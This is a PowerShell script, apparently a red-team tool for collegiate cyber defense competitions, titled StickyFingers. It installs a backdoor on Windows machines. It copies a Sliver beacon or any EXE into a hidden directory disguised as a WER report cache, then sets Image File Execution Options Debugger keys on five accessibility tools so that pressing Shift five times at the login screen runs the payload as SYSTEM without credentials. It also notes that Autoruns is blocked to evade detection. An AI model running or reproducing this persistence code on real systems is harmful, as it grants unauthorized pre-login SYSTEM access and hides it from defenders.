#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC_Windows_Sliver_StickyFingers.ps1
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
#  Plants a Sliver (or any EXE) beacon into Windows accessibility tool
#  Image File Execution Options (IFEO) Debugger keys.
#
#  HOW IT WORKS:
#    Windows accessibility shortcuts (Sticky Keys = Shift x5, Utility Manager
#    = Win+U) execute their tools from the Windows login screen - BEFORE any
#    user authenticates. By redirecting them to a beacon via IFEO, an RDP
#    connection to the login screen and pressing Shift 5 times gives a SYSTEM
#    shell with no credentials required.
#
#  TARGETS (4 keys, redundant):
#    sethc.exe    - Sticky Keys       (Shift x5 at login screen)
#    utilman.exe  - Utility Manager   (Win+U at login screen)
#    osk.exe      - On-Screen Keyboard
#    narrator.exe - Narrator
#    magnify.exe  - Magnifier
#
#  DETECTION NOTE:
#    SysInternalsNuker.ps1 blocks Autoruns, which is the primary tool that
#    reveals IFEO entries. IFEO Debugger keys are listed under:
#    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
#    Options\<process>\Debugger
#
#  Usage:
#    .\CCDC_Windows_Sliver_StickyFingers.ps1 -PayloadPath C:\sliver_beacon.exe
#
#  Payload: .exe ONLY (IFEO Debugger launches a process, not a script)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }

Write-Host ""
Write-Warn  "================================================================"
Write-Warn  " CCDC Windows IFEO Accessibility Backdoor - StickyFingers.ps1"
Write-Warn  "================================================================"
Write-Host "  Technique : IFEO Debugger key on Windows accessibility tools" -ForegroundColor Yellow
Write-Host "  Trigger   : Shift x5 (Sticky Keys) at Windows login screen" -ForegroundColor Yellow
Write-Host "  Context   : SYSTEM, pre-authentication - no credentials needed" -ForegroundColor Yellow
Write-Host ""

# =============================================================================
# Validate payload (must be EXE - IFEO Debugger runs a process)
# =============================================================================
if (-not (Test-Path $PayloadPath)) {
    Write-Err "Payload not found: $PayloadPath"
    exit 1
}

if ($PayloadPath -notmatch '\.exe$') {
    Write-Err "Payload must be an .exe - IFEO Debugger requires an executable, not a script."
    Write-Err "For a PS1 payload, wrap it in a small EXE launcher first."
    exit 1
}
Write-Info "Payload: $PayloadPath"
Write-Host ""

# =============================================================================
# Hidden drop directory (same as ClusterShells)
# =============================================================================
$DropDir = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
if (-not (Test-Path $DropDir)) {
    New-Item -ItemType Directory -Path $DropDir -Force | Out-Null
}
$dirObj = Get-Item $DropDir -Force
$dirObj.Attributes = $dirObj.Attributes -bor [System.IO.FileAttributes]::Hidden

# Each accessibility target gets its own copy - removing one file doesn't kill all triggers
$DropTargets = @(
    @{ Process = "sethc.exe";    DropName = "acchost-sethc.exe";   Desc = "Sticky Keys (Shift x5 at login screen)" }
    @{ Process = "utilman.exe";  DropName = "acchost-utilman.exe";  Desc = "Utility Manager (Win+U at login screen)" }
    @{ Process = "osk.exe";      DropName = "acchost-osk.exe";      Desc = "On-Screen Keyboard" }
    @{ Process = "narrator.exe"; DropName = "acchost-narrator.exe"; Desc = "Narrator" }
    @{ Process = "magnify.exe";  DropName = "acchost-magnify.exe";  Desc = "Magnifier" }
)

$IFEOBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

# =============================================================================
# Plant IFEO Debugger for each accessibility tool
# =============================================================================
foreach ($target in $DropTargets) {
    Write-Info "Planting for $($target.Process) - $($target.Desc) ..."

    # Drop a unique copy of the payload for this target
    $DropPath = "$DropDir\$($target.DropName)"
    try {
        Copy-Item -Path $PayloadPath -Destination $DropPath -Force
        $fDrop = Get-Item $DropPath -Force
        $fDrop.Attributes = $fDrop.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Success "  Drop: $DropPath (hidden)"
    } catch {
        Write-Err "  Failed to copy payload for $($target.Process): $_"
        continue
    }

    # Create/update IFEO key
    $IFEOKey = "$IFEOBase\$($target.Process)"
    try {
        if (-not (Test-Path $IFEOKey)) {
            New-Item -Path $IFEOKey -Force | Out-Null
        }
        Set-ItemProperty -Path $IFEOKey -Name "Debugger" -Value "`"$DropPath`"" -Type String -Force
        Write-Success "  IFEO: $IFEOKey"
        Write-Success "  Debugger -> `"$DropPath`""
    } catch {
        Write-Err "  Failed to set IFEO for $($target.Process): $_"
        continue
    }

    Write-Host ""
}

# =============================================================================
# Summary
# =============================================================================
Write-Warn  "================================================================"
Write-Warn  " STICKY FINGERS PLANTED - 5 IFEO KEYS"
Write-Warn  "================================================================"
Write-Host ""
Write-Host "  HOW TO TRIGGER:" -ForegroundColor Cyan
Write-Host "    1. RDP to the target machine (any account, or no account)" -ForegroundColor Cyan
Write-Host "    2. Reach the Windows login screen" -ForegroundColor Cyan
Write-Host "    3. Press Shift 5 times rapidly" -ForegroundColor Cyan
Write-Host "    4. Sliver beacon executes as SYSTEM" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Alternative triggers (same effect):" -ForegroundColor Cyan
Write-Host "    - Win+U at login screen (Utility Manager -> utilman.exe)" -ForegroundColor Cyan
Write-Host "    - Win+Enter at login screen (Narrator -> narrator.exe)" -ForegroundColor Cyan
Write-Host ""
Write-Host "  IFEO keys planted:" -ForegroundColor Yellow
foreach ($target in $DropTargets) {
    Write-Host "    HKLM:\...\Image File Execution Options\$($target.Process)\Debugger" -ForegroundColor Red
}
Write-Host ""
Write-Host "  Payload copies in: $DropDir (directory hidden)" -ForegroundColor Yellow
Write-Host ""
Write-Warn  "NOTE: Runs as SYSTEM - no user login required."
Write-Warn  "      Blue team passwords and lockouts do NOT stop this vector."
Write-Host ""
